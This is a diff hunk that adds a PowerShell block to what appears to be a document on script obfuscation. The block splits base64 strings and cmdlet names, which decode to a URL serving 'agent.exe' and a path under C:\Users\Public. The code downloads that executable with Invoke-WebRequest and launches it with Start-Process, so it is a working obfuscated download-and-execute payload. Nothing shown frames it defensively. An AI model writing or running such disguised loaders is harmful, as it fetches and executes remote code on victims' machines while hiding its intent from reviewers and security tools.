@@ -83,3 +83,23 @@ $x = "s" + "TarT" + "-pr" + "OCesS"         # Start-Process
 & (Get-Command $x) $f
 
 ```
+
+```powershell
+$a1 = "a" + "HR" + "0cDovLzE5Mi4xNjguMi4yMjg6ODA4MC9hZ2VudC5leGU="
+$a2 = "Y" + "Wdlb" + "nQuZXhl"
+$a3 = "Q" + "zpc" + "VXN" + "lcnNcU" + "HVibGlj"
+function _ { 
+    param($__)
+    $d = [System.Convert]::FromBase64String($__)
+    [System.Text.Encoding]::UTF8.GetString($d)
+}
+$u = & _ $a1
+$n = & _ $a2
+$p = & _ $a3
+$f = (&('Joi' + 'n-Path') ($p) ($n))
+$w = "i" + "wr"   
+$x = "s" + "TarT" + "-pr" + "OCesS"         
+& (Get-Command $w) -Uri $u -OutFile $f
+& (Get-Command $x) $f
+
+```
